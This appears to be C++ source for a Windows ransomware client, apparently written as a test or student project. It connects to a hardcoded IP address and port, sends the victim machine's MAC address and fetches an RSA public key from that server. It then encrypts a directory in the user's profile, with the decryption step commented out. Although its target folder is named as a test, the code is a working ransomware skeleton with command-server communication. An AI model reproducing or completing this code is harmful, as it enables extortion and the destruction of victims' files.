#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <openssl/applink.c>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include "framework.h"
#include "client.h"
#include "rsa.hpp"
#include "fileEnc.hpp"
#include "internet.hpp"

using namespace std;

#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

const string SERVER_IP = "3.35.13.136";
const int SERVER_PORT = 54000;


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    // 소켓 초기화
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        return -1;
    }
    // 소켓 생성
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        return -2;
    }
    // 서버 연결
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP.c_str(), &hint.sin_addr);

    int connectResult = connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
    if (connectResult == SOCKET_ERROR) {
        std::cerr << "Can't connect to server! Quitting" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return -3;
    }

    // MAC 주소 가져오기
    string wifiMacAddress = getMacAddress();
    // 서버로 MAC 주소 전송
    send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);

    // start 인경우 -> 공개키 저장
    // TOOD : end인 경우 -> 개인키 저장
    send(clientSocket, "start", sizeof("start"), 0);

    // 서버로부터 공개키 수신
    unsigned char publicKeyBuf[294];
    // TODO : 받아온 사이즈 중에서 CC 인 부분은 자를 수 있도록
    int publicKeyLen = recv(clientSocket, reinterpret_cast<char*>(publicKeyBuf), 294, 0);
    if (publicKeyLen <= 0) {
        std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return -4;
    }
    HANDLE hFile = CreateFile(L"public_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create file." << std::endl;
        return 0;
    }
    DWORD bytesWritten;
    if (!WriteFile(hFile, publicKeyBuf, sizeof(publicKeyBuf), &bytesWritten, NULL)) {
        std::cerr << "Failed to write to file." << std::endl;
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);

    string filename = "C:\\Users";
    string userName = getUserName();
    filename += "\\" + userName + "\\ransomeware_test_file";

    RSA* pubKey = getPubKey();
    EncryptDir(pubKey, filename);
    RSA_free(pubKey);
    
    /*
    RSA* priKey = getPriKey();
    DecryptDir(priKey, filename);
    RSA_free(priKey);
    */
    return 0;
}



